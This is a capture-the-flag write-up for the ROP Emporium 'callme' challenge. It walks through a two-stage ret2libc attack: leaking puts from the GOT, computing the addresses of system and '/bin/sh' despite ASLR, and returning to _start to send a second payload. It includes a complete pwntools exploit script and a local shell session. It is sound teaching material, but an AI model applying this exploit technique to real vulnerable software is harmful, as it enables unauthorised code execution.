# shell

_was getting the flag really not enough?_

So, if you're reading this, getting the flag was indeed not enough for you, and you want a shell.

Well, then this is the writeup for you.

The challenge author actually alludes to this in the end notes of the challenge description:

> Once you've solved this challenge in the intended way you can revisit it and solve it using a different technique that can even get you a shell rather than just printing the flag. If you're out of ideas though, consider making it to the "pivot" challenge first so that you're equipped with the knowledge to take this alternate path.

He's right, we can indeed get a shell with an alternative method, and it's called a `ret2libc` attack. Best part is, we're gonna do this with ASLR enabled, on x86-64, with just one gadget.

So, how does a `ret2libc` attack work? First, we need to talk about the Global Offset Table, or GOT.

If you had read up on the PLT, you may have also heard of the GOT. This is where all offsets to objects and functions within the virtual address space are stored. After an imported function is called, the processor jumps to the PLT, where it finds another address to jump to. This address points to the GOT. When it is called for the first time, instead of calling the function, a special subroutine within `libc` known as `_dl_resolve` is called. This subroutine resolves the actual address of the function being called and populates its entry in the GOT with the address. Every subsequent call is then passed through the PLT and resolved through the GOT. tl;dr, the GOT contains the absolute address of a function in a shared library and if we can leak this, we can launch our attack.

Our attack will happen in two stages. First, we leak the address of a function from the GOT. Since we can find out the offset of this function and `system` within the `libc` binary, we can calculate the address of `libc` from this address and from there, the address of `system`. Next, we can then launch a second stage and ROP our way to calling `system` to give us a shell.

With that out of the way, let's look at Cutter and see what we can use.

```text
sym.imp.callme1
sym.imp.callme2
sym.imp.callme3
sym.imp.printf
sym.imp.puts
sym.imp.exit
```

Unfortunately for us, `system` is never called within this binary, so it has no corresponding entry in the PLT or GOT. However, we can leak the address of other functions and use that as a jumping point to eventually ROP our way there.

Looking at our list of imported functions, we need a function to print characters to stdout. For this, we can use either `printf` or `puts`. `printf` is a variadic function, and requires a format string to print its information in a way we can parse. This would require writing a string to memory, and that's reserved for challenge 4. So, `puts` it is.

In order to leak the address of a function, we need it to be called first so its address can be resolved in the GOT. Fortunately, `puts` is already called in `pwnme`, so that's not an issue. With this, we can construct a basic script to leak the address of `puts`. This is our initial setup:

```python
from pwn import *

elf = context.binary = ELF("./callme")

# we can resolve the address of the entries through pwntools, no disassembler needed.
# important: these are _addresses_, not the actual value.
PUTS_PLT = elf.plt["puts"]
PUTS_GOT = elf.got["puts"]

# why do we need _start? You'll see in a bit.
START = elf.symbols._start
```

Using `pwntools`, we can resolve the addresses of the PLT and GOT entries of `puts`. We need both because we'll be calling `puts` to leak its own GOT entry, and we will be calling it from the PLT.

Of course, we'll need to ROP our way to a call to `puts`. We already know how to do this with a quick gadget search (using `ropper` this time):

```text
$ ropper -f ./callme --search "pop rdi"

[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi

[INFO] File: ./callme
0x000000000040093c: pop rdi; pop rsi; pop rdx; ret; 
0x00000000004009a3: pop rdi; ret;
```

```python
POP_RDI_GADGET = p64(0x4009a3)

payload1 = b'A' * 40

# pop the address of puts' GOT entry into rdi
payload1 += POP_RDI_GADGET
payload1 += p64(PUTS_GOT)
# call puts
payload1 += p64(PUTS_PLT)
```

Alright, so after calling `puts` through a gadget, we need to read back the information and parse it. Let's just blindly read back everything and print it for now, just to see what it's doing.

```python
conn = process()
conn.recvuntil(b'> ')

conn.send(payload1)

print(conn.recvall())
```

Before we start, we should probably disable ASLR for debugging purposes:

```text
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

Running the script, we get this output:

```text
$ python shell.py

[*] '/home/sammy/Projects/binexp/ropemporium/3-callme/callme'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
[+] Starting local process '/home/sammy/Projects/binexp/ropemporium/3-callme/callme': pid 33898
[+] Receiving all data: Done (18B)
[*] Process '/home/sammy/Projects/binexp/ropemporium/3-callme/callme' stopped with exit code -11 (SIGSEGV) (pid 33898)
b'Thank you!\n\xa0\x15\xa7\xf7\xff\x7f\n'
```

Okay, so we've read in the author's expression of gratitude, and a few bytes. But we've only read in 6, instead of the expected 8. Why?

This is why we disabled ASLR, so we can debug. We can run `ldd` a few times to check the libraries loaded with the binary, and make sure they're all loaded at the same address each time:

```text
$ ldd callme

        linux-vdso.so.1 (0x00007ffff7fc4000)
        libcallme.so => ./libcallme.so (0x00007ffff7c00000)
        libc.so.6 => /usr/lib/libc.so.6 (0x00007ffff79f6000)
        /lib64/ld-linux-x86-64.so.2 => /usr/lib64/ld-linux-x86-64.so.2 (0x00007ffff7fc6000)

$ ldd callme

        linux-vdso.so.1 (0x00007ffff7fc4000)
        libcallme.so => ./libcallme.so (0x00007ffff7c00000)
        libc.so.6 => /usr/lib/libc.so.6 (0x00007ffff79f6000)
        /lib64/ld-linux-x86-64.so.2 => /usr/lib64/ld-linux-x86-64.so.2 (0x00007ffff7fc6000)

$ ldd callme

        linux-vdso.so.1 (0x00007ffff7fc4000)
        libcallme.so => ./libcallme.so (0x00007ffff7c00000)
        libc.so.6 => /usr/lib/libc.so.6 (0x00007ffff79f6000)
        /lib64/ld-linux-x86-64.so.2 => /usr/lib64/ld-linux-x86-64.so.2 (0x00007ffff7fc6000)
```

We can see each time, the binary is loaded at `0x00007ffff79f6000`. And from there, we can see why we are missing two bytes.

Because x86-64 is a little endian instruction set, all numbers are placed least significant byte first. This means, essentially, that all numbers are sitting backwards in memory. Therefore, `puts` starts from the last byte and reads forward, and stops when it encounters a null byte, which is the two leading bytes in this address. The reason why it didn't stop at the very first byte (which is null here) is because we're printing out the offset of `puts` from this address, so that byte is guaranteed to be non-null.

Also, as it turns out, Linux ASLR loads all shared objects from address `0x00007fxxxxxxxxxx`. This means we can simply read in the six bytes and pad them with two null bytes, to get our 8 byte address.

Great. Now let's just throw out some code to unpack our bytes into an integer.

```python
conn.recvuntil(b"Thank you!\n")
# bit of a hack but it worked
puts_addr = u64(conn.recv(6) + b'\x00\x00')
print("[*] received libc_puts address %s" % hex(puts_addr))
```

Running it, we get:

```text
$ python shell.py

[*] '/home/sammy/Projects/binexp/ropemporium/3-callme/callme'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
[+] Starting local process '/home/sammy/Projects/binexp/ropemporium/3-callme/callme': pid 39511
[*] received libc_puts address 0x7ffff7a715a0
[*] Stopped process '/home/sammy/Projects/binexp/ropemporium/3-callme/callme' (pid 39511)
```

Nice, we have our `puts` address. Now we just need to get its offset. Amd for this, we will be examining our very own `libc`.

On my machine, the `libc` shared object being used is `/usr/lib/libc.so.6`. Let's load it up in Cutter (this will take a while), and once it's loaded, seek for the function with `sym.puts`:

```text
int puts (const char *s);
; var int64_t var_ch @ rsp+0xc
; arg const char *s @ rdi
0x0007b5a0      f30f1efa               endbr64
0x0007b5a4      4156                   push    r14
0x0007b5a6      4155                   push    r13
0x0007b5a8      4154                   push    r12
0x0007b5aa      4989fc                 mov     r12, rdi ; s
0x0007b5ad      55                     push    rbp
0x0007b5ae      53                     push    rbx
0x0007b5af      4883ec10               sub     rsp, 0x10
...
```

Looking at the address, we can see it looks a bit different. That's because as a shared library, all addresses are shown as offsets, in order to be position-independent when executing. Therefore, we now have our offset for `puts`.

We can give `system` the same treatment:

```text
int __libc_system (const char *string);
; arg const char *string @ rdi
0x0004f230      f30f1efa               endbr64
0x0004f234      4885ff                 test    rdi, rdi ; string
0x0004f237      7407                   je      0x4f240
0x0004f239      e992fbffff             jmp     do_system ; sym.do_system
0x0004f23e      6690                   nop
0x0004f240      4883ec08               sub     rsp, 8
0x0004f244      488d3dd2de1600         lea     rdi, str.exit_0 ; 0x1bd11d ; int64_t arg1
0x0004f24b      e880fbffff             call    do_system ; sym.do_system
0x0004f250      85c0                   test    eax, eax
0x0004f252      0f94c0                 sete    al
0x0004f255      4883c408               add     rsp, 8
0x0004f259      0fb6c0                 movzx   eax, al
0x0004f25c      c3                     ret
0x0004f25d      0f1f00                 nop     dword [rax]
```

So, the offset of `puts` is `0x7b5a0`, and the offset of `system` is `0x4f230`.

In fact, we can confirm this in interactive Python:

```python
>>> from pwn import *
>>> elf = context.binary = ELF("./callme")
[*] '/home/sammy/Projects/binexp/ropemporium/3-callme/callme'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
>>> libc = elf.libc
[*] '/usr/lib/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
>>> hex(libc.sym["puts"])
'0x7b5a0'
>>> hex(libc.sym["system"])
'0x4f230'
```

Why are we even using Cutter if we can do everything from Python? Good question.

Now that we have our addresses and offsets, we can move on to the next stage. But first, we need to set up for that:

```python
from pwn import *

elf = context.binary = ELF("./callme")

PUTS_PLT = elf.plt["puts"]
PUTS_GOT = elf.got["puts"]

POP_RDI_GADGET = p64(0x4009a3)

libc = elf.libc

LIBC_SYSTEM = libc.sym["system"]
LIBC_PUTS = libc.sym["puts"]

payload1 = b'A' * 40

# pop the address of puts on the got into rdi
payload1 += POP_RDI_GADGET
payload1 += p64(PUTS_GOT)
# call puts
payload1 += p64(PUTS_PLT)

conn = process()

conn.recvuntil(b'> ')

print("[*] sending payload 1")
conn.send(payload1)

conn.recvuntil(b"Thank you!\n")
# bit of a hack but it worked
puts_addr = u64(conn.recv(6) + b'\x00\x00')
print("[*] received libc_puts address %s" % hex(puts_addr))

# calculate the address of system

# from the leaked address of puts, use its offset to calculate the address of libc
libc_leak = puts_addr - LIBC_PUTS
print("[*] libc leaked address is %s" % hex(libc_leak))
# from there, add the offset of system to calculate its address
libc_system_leak = libc_leak + LIBC_SYSTEM
print("[*] system leaked address is %s" % hex(libc_system_leak))
```

Running it, we get:

```text
$ python shell.py

[*] '/home/sammy/Projects/binexp/ropemporium/3-callme/callme'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
[*] '/usr/lib/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process '/home/sammy/Projects/binexp/ropemporium/3-callme/callme': pid 54924
[*] sending payload 1
[*] received libc_puts address 0x7ffff7a715a0
[*] libc leaked address is 0x7ffff79f6000
[*] system leaked address is 0x7ffff7a45230
[*] Stopped process '/home/sammy/Projects/binexp/ropemporium/3-callme/callme' (pid 54924)
```

We can see that our `libc` address is correct, which means we carried out the leak correctly.

Great. Now that we have the address of `system`, we just have one thing left: the parameter to pass to it. Obviously it's going to be `/bin/sh`, but where can we get that string without writing it into memory ourselves? Well, we have this massive shared library used by literally every program in the Linux ecosystem, surely there's going to be something in there right?

And we'd be right. A simple search with `strings` yields what we need right away:

```text
$ strings -t x /usr/lib/libc.so.6 | grep /bin/sh

 1bd115 /bin/sh
```

As luck would have it, we have a string with the exact content we need at offset 0x1bd115. We can again confirm this with Python:

```python
>>> hex(next(libc.search(b'/bin/sh')))
'0x1bd115'
```

And now all we need is some gadgets. Which, come to think of it, we already have. Remember earlier, when we used that `pop rdi` gadget? We can use it again here to get the address of the string into `rdi`.

Some observant readers may have noticed by now that we need to send two payloads, one to leak the address and one to pop our shell, but we only have one opportunity to read in data. How do we get around this? Well, with more ROP of course. We can simply put the address of the program's entry point (most Linux programs use `_start`) at the end of our first payload. This essentially restarts the entire program once the leak finishes without reloading the entire binary, thereby preserving the address of `libc`, and allows us to read in a second payload.

So all that's left is to re-enable ASLR...

```text
echo 1 | sudo tee /proc/sys/kernel/randomize_va_space
```

put the entire script together...

```python
from pwn import *

elf = context.binary = ELF("./callme")

# get all the information we need first.

# the addresses of puts' PLT and GOT entries.
PUTS_PLT = elf.plt["puts"]
PUTS_GOT = elf.got["puts"]

# the address of our entry point.
START = elf.symbols._start

# the gadget we need.
POP_RDI_GADGET = p64(0x4009a3)

libc = elf.libc

# our libc offsets.
LIBC_SYSTEM = libc.sym["system"]
LIBC_PUTS = libc.sym["puts"]
LIBC_BINSH = next(libc.search(b"/bin/sh"))

# construct our first payload.

payload1 = b'A' * 40

# pop the address of puts on the got into rdi
payload1 += POP_RDI_GADGET
payload1 += p64(PUTS_GOT)
# call puts
payload1 += p64(PUTS_PLT)
# call start
payload1 += p64(START)

conn = process()

conn.recvuntil(b'> ')

print("[*] sending payload 1")
conn.send(payload1)

# read in the output and parse it into an int
conn.recvuntil(b"Thank you!\n")
# bit of a hack but it works
puts_addr = u64(conn.recv(6) + b'\x00\x00')
print("[*] received libc_puts address %s" % hex(puts_addr))

# compute our final addresses from our leaked address and offsets
libc_leak = puts_addr - LIBC_PUTS
print("[*] libc leaked address is %s" % hex(libc_leak))
libc_system_leak = libc_leak + LIBC_SYSTEM
print("[*] calculated system address is %s" % hex(libc_system_leak))
libc_binsh_leak = libc_leak + LIBC_BINSH

# construct our second payload.

payload2 = b'A' * 40

# ret to pop rdi
payload2 += POP_RDI_GADGET
payload2 += p64(libc_binsh_leak)

# ret to system
payload2 += p64(libc_system_leak)

conn.recvuntil(b'> ')

print("[*] sending payload 2")
conn.send(payload2)

# enter interactive
conn.interactive()
```

...and run it.

```text
$ python shell.py

[*] '/home/sammy/Projects/binexp/ropemporium/3-callme/callme'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
[*] '/usr/lib/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process '/home/sammy/Projects/binexp/ropemporium/3-callme/callme': pid 64146
[*] sending payload 1
[*] received libc_puts address 0x7fd5662715a0
[*] libc leaked address is 0x7fd5661f6000
[*] calculated system address is 0x7fd566245230
[*] sending payload 2
[*] Switching to interactive mode
Thank you!
$ uname -a
Linux cartoonraccoon 5.16.9-arch1-1 #1 SMP PREEMPT Fri, 11 Feb 2022 22:42:06 +0000 x86_64 GNU/Linux
$ id
uid=1000(sammy) gid=1000(sammy) groups=1000(sammy),995(audio),998(wheel)
$ cat shell_flag.txt
flag{c0ngr4t5_y0u_got_4_sh3l1}
```
